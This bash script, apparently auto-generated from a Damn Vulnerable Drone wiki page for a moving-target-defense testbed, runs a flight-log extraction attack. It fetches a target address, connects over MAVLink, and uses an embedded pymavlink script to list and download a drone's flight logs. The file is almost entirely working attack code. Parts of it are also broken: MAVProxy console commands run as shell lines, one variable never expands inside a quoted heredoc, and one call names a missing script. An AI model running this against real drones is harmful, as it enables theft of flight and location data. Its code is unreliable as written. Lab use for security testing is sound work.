#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Flight-Log-Extraction.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition
# This block dynamically queries the MTD interface for an active target.
# ==========================================================
echo "INFO: Querying MTD interface for active target..."

# --- Project Root Resolution ---
# 1. 현재 실행되는 쉘 스크립트의 실제 위치를 찾습니다.
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
# 2. 'dvd_lite' 폴더를 포함하는 프로젝트 루트 디렉토리를 찾습니다. (현재 위치에서 4단계 위)
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../../../")
# -----------------------------

# PYTHONPATH 환경 변수 대신, 직접 프로젝트 루트로 이동하여 파이썬 모듈을 실행합니다.
# 이 방식은 'sudo'가 환경 변수를 초기화하는 문제를 우회할 수 있어 더 안정적입니다.
pushd "$PROJECT_ROOT" > /dev/null
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
popd > /dev/null

if [ $? -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

# 콜론을 기준으로 IP와 PORT를 분리하여 변수에 저장합니다.
TARGET_IP=$(echo $TARGET_ADDR | cut -d: -f1)
TARGET_PORT=$(echo $TARGET_ADDR | cut -d: -f2)

echo "INFO: Active target acquired -> ${TARGET_IP}:${TARGET_PORT}"
# MTD_INTERFACE_END

set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=flight-log-extraction src=Flight-Log-Extraction.md"
log "[BLOCK 1] type=shell"
mavproxy.py --master=tcp:${TARGET_IP}:${TARGET_PORT}

log "[BLOCK 2] type=shell"
log list
log download <log_index>

log "[BLOCK 3] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:${TARGET_PORT}')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
import sys
from pymavlink import mavutil

def list_logs(connection):
    connection.mav.log_request_list_send(
        connection.target_system, 
        connection.target_component, 
        0, 0xffff
    )

    logs = []
    while True:
        msg = connection.recv_match(type=['LOG_ENTRY'], blocking=True, timeout=5)
        if msg is None:
            break
        logs.append(msg)
    return logs

def download_log(connection, log_id, log_size, filename):
    with open(filename, 'wb') as file:
        bytes_received = 0
        ofs = 0
        while bytes_received < log_size:
            connection.mav.log_request_data_send(
                connection.target_system,
                connection.target_component,
                log_id,
                ofs,
                90
            )
            while True:
                msg = connection.recv_match(type=['LOG_DATA'], blocking=True, timeout=5)
                if msg is None:
                    break
                if msg.id != log_id or msg.ofs != ofs:
                    continue
                data = bytes(msg.data)
                file.write(data)
                bytes_received += len(data)
                ofs += len(data)
                print(f"Received {bytes_received}/{log_size} bytes")
                break

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python log-extract.py <connection_string> <log_id>")
        sys.exit(1)

    connection_string = sys.argv[1]
    log_id = int(sys.argv[2])

    connection = mavutil.mavlink_connection(connection_string)
    connection.wait_heartbeat()

    logs = list_logs(connection)
    for log in logs:
        print(f"Log ID: {log.id}, Size: {log.size}, Time: {log.time_utc}")

    log_to_download = next((log for log in logs if log.id == log_id), None)
    if log_to_download:
        download_log(connection, log_to_download.id, log_to_download.size, f"log_{log_id}.bin")
        print(f"Log {log_id} downloaded successfully.")
    else:
        print(f"Log ID {log_id} not found.")
PY

log "[BLOCK 4] type=shell"
python log-extract.py tcp:${TARGET_IP}:${TARGET_PORT} 1

log "[BLOCK 5] type=shell"
bin2csv -o logs_csv log_1.bin

